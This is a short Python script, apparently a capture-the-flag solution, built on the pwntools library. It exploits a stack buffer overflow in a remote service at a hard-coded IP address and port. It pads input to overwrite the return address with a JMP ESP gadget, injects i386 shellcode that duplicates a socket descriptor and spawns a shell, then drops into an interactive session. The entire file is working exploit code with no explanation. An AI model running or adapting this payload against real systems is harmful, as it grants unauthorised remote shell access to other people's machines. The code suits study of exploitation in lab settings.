import pwn
import sys

shellcode = pwn.asm("""
mov eax, esp
""" + pwn.shellcraft.i386.mov('ebx', 8410) + """
add eax, ebx
mov ebp, dword ptr [eax+6]
""" + pwn.shellcraft.i386.linux.dupsh('ebp'))

assert "\x00" not in shellcode

JMP_ESP = 0x080488b0

s = pwn.remote('54.163.248.69', 9000)
s.send('echo ' + 'a' * 118 + pwn.p32(JMP_ESP) + shellcode + '\n')
print s.recv(1024)

s.interactive()

